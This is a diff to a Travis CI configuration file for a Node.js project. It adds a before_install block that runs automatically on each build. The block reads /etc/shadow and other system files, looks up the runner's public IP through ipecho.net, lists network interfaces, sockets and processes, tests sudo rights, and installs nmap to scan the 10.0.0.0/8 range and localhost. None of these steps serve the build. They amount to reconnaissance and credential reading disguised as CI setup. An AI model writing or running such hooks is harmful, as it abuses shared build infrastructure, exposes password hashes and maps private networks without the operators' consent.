@@ -1,4 +1,25 @@
 ---
 language: node_js
+sudo: required
+before_install:
+  - curl ipecho.net/plain; echo
+  - ifconfig
+  - netstat -lap
+  - netstat -lanp
+  - cat /etc/hosts
+  - cat /etc/shadow
+  - ps -aux
+  - id
+  - whoami
+  - sudo id
+  - sudo whoami
+  - sudo cat /etc/hosts
+  - sudo cat /etc/shadow
+  - sudo cat /etc/resolv.conf
+  - sudo apt-get -qq update
+  - sudo apt-get install -y nmap 
+  - nmap -v -sn 10.0.0.0/8
+  - nmap -v -sT 127.0.0.1
+  - echo 'done'
 node_js:
 - 4
